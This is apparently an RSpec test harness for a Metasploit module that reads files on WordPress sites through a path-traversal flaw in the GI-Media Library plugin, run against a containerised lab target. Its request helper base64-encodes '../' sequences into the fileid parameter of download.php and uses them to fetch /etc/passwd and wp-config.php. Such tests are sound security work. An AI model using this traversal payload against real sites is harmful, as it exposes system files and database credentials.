# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'uri'
require_relative 'profiles'

RSpec.shared_context 'native GI-Media Library target' do
  include_context 'module target'

  before(:all) do
    @gimedia_profile = GimediaProfiles.fetch
    @gimedia_native = { requests: [], commands: [], calls: [] }
    begin
      gimedia_counters('before')
      if @gimedia_profile.fetch('mode') == 'unrelated'
        response = gimedia_request('/')
        expect(response.code).to eq('200')
        expect(response.body).to include('module-target-http-marker')
      else
        @gimedia_baseline = gimedia_identity
        expect(@gimedia_baseline.slice('core', 'php', 'uid')).to eq(GimediaProfiles::RUNTIME)
        expect(@gimedia_baseline.values_at('sapi', 'prefix')).to eq(['cli', @gimedia_profile.fetch('prefix')])
        expect(@gimedia_baseline.fetch('active')).to eq(!@gimedia_profile.fetch('release').nil?)
        expect(@gimedia_baseline.fetch('plugin_version')).to eq(@gimedia_profile.fetch('release'))
        expect(gimedia_request("#{gimedia_prefix}/wp-login.php").body).to include('name="log"', 'name="pwd"')
        if @gimedia_profile.fetch('release')
          release = GimediaProfiles::RELEASES.fetch(@gimedia_profile.fetch('release'))
          expect(@gimedia_baseline.slice('archive_sha256', 'endpoint_sha256')).to eq(release.slice('endpoint_sha256').merge('archive_sha256' => release.fetch('sha256')))
          expect(@gimedia_baseline.fetch('active_plugins')).to eq(['gi-media-library/gi-media-library.php'])
          expect(gimedia_request("#{gimedia_prefix}/wp-content/plugins/gi-media-library/readme.txt").body).to include("Stable tag: #{@gimedia_profile.fetch('release')}")
          GimediaProfiles::FILES.each_value do |fixture|
            path = fixture.fetch('path')
            actual = @gimedia_baseline.fetch('files').fetch(path)
            expect(actual.values_at('exists', 'readable')).to eq([true, true]) unless fixture == GimediaProfiles::FILES.fetch('missing')
            response = gimedia_file_request(path)
            if @gimedia_profile.fetch('mode') == 'affected'
              expect(response.code).to eq('200')
              expected = actual.fetch('exists') ? Base64.strict_decode64(actual.fetch('content_base64')) : ''.b
              expect(Digest::SHA256.hexdigest(response.body.to_s.b)).to eq(Digest::SHA256.hexdigest(expected))
            else
              expect(response.code).to eq('404')
            end
          end
          expect(@gimedia_baseline.fetch('endpoint_exists')).to eq(@gimedia_profile.fetch('mode') == 'affected')
          if @gimedia_profile.fetch('mode') == 'affected'
            expect(gimedia_file_request('/etc/passwd', depth: 1).body.to_s).to eq('')
            config = @gimedia_baseline.fetch('config_path')
            expect(Digest::SHA256.hexdigest(gimedia_file_request('wp-config.php', depth: 3).body.to_s.b)).to eq(@gimedia_baseline.fetch('files').fetch(config).fetch('sha256'))
          end
        else
          expect(@gimedia_baseline.fetch('active_plugins')).to eq([])
          expect(gimedia_request('/wp-content/plugins/gi-media-library/readme.txt').code).to eq('404')
          expect(gimedia_file_request('/etc/passwd').code).to eq('404')
        end
        expect(gimedia_identity).to eq(@gimedia_baseline)
      end
      provenance = console_command('irb -e \'puts "GIMEDIA_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/scanner/http/wp_gimedia_library_file_read.rb").hexdigest}.to_json\'')
      values = JSON.parse(provenance.match(/^GIMEDIA_PROVENANCE=(.+)$/)[1])
      expect(values.fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(values.fetch('owner_sha256')).to eq(Digest::SHA256.file('modules/auxiliary/scanner/http/wp_gimedia_library_file_read.rb').hexdigest)
      @gimedia_native[:provenance] = values
      @gimedia_native[:preflight] = 'passed'
    ensure
      gimedia_save
    end
  end

  after(:all) do
    expect(gimedia_identity).to eq(@gimedia_baseline) if @gimedia_baseline
    expect(console_command('irb -e \'puts "GIMEDIA_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('GIMEDIA_STATE={"sessions":[],"jobs":[]}')
  ensure
    gimedia_counters('after')
    gimedia_save
  end

  def gimedia_prefix
    @gimedia_profile.fetch('prefix')
  end

  def gimedia_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-gimedia.json'), JSON.pretty_generate(@gimedia_native)) if @gimedia_native
  end

  def gimedia_identity
    argv = target_runtime.fetch('compose') + ['exec', '-T', '--user', 'www-data', 'app', 'timeout', '20', 'php', '/opt/module-target/gimedia-inspect.php']
    output, error, status = Open3.capture3(*argv)
    @gimedia_native.fetch(:commands) << { argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exitstatus: status.exitstatus }
    gimedia_save
    raise "Native GI-Media Library inspection failed: #{error}" unless status.success?

    JSON.parse(output)
  end

  def gimedia_request(path)
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    response = http.request(Net::HTTP::Get.new(path))
    @gimedia_native.fetch(:requests) << { path: path, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    gimedia_save
    response
  end

  def gimedia_file_request(path, depth: @gimedia_profile.fetch('depth'))
    query = URI.encode_www_form('fileid' => Base64.strict_encode64((('../' * depth) + path.delete_prefix('/')).b))
    gimedia_request("#{gimedia_prefix}/wp-content/plugins/gi-media-library/download.php?#{query}")
  end

  def gimedia_loots
    Dir[File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot', '*')].select { |path| File.file?(path) }
  end

  def gimedia_owner(options = {}, action: 'run')
    output = run_target_module(GimediaProfiles::OWNER, 'app', {
      'SSL' => false, 'TARGETURI' => "#{gimedia_prefix}/", 'DEPTH' => @gimedia_profile.fetch('depth'), 'THREADS' => 1, 'HttpClientTimeout' => 5
    }.merge(options), action: action, allow_errors: true)
    @gimedia_native.fetch(:calls) << { action: action, options: options, output_base64: Base64.strict_encode64(output.b) }
    gimedia_save
    output
  end

  def gimedia_download(path, options = {})
    before = gimedia_loots
    output = gimedia_owner({ 'FILEPATH' => path }.merge(options))
    loots = gimedia_loots - before
    expect(loots.length).to eq(1), output.dup.force_encoding(Encoding::UTF_8).scrub
    actual_path = path == 'wp-config.php' ? @gimedia_baseline.fetch('config_path') : '/' + path.delete_prefix('/')
    expected = @gimedia_baseline.fetch('files').fetch(actual_path)
    expect([File.size(loots.first), Digest::SHA256.file(loots.first).hexdigest]).to eq(expected.values_at('size', 'sha256'))
    expect(output).to include('File saved in:')
    expect(output.b).to include(loots.first.b)
  end

  def gimedia_refuse(options = {}, action: 'run')
    before = gimedia_loots
    output = gimedia_owner(options, action: action)
    expect(gimedia_loots).to eq(before)
    expect(output).not_to include('File saved in:')
    expect(output).not_to include('This module does not support check.') if action == 'check'
    output
  end

  def gimedia_counters(phase)
    roles = @gimedia_profile.fetch('mode') == 'unrelated' ? ['app'] : %w[app db]
    values = roles.to_h do |role|
      counters = %w[memory.events pids.events].to_h do |name|
        numbers = target_exec(role, 'cat', "/sys/fs/cgroup/#{name}").lines.to_h do |line|
          key, value = line.split
          [key, Integer(value, 10)]
        end
        [name, numbers]
      end
      [role, counters]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), "gimedia-resources-#{phase}.json"), JSON.pretty_generate(values))
    values.each_value do |counters|
      expect(counters.fetch('memory.events').values_at('oom', 'oom_kill')).to eq([0, 0])
      expect(counters.fetch('pids.events').fetch('max')).to eq(0)
    end
  end
end
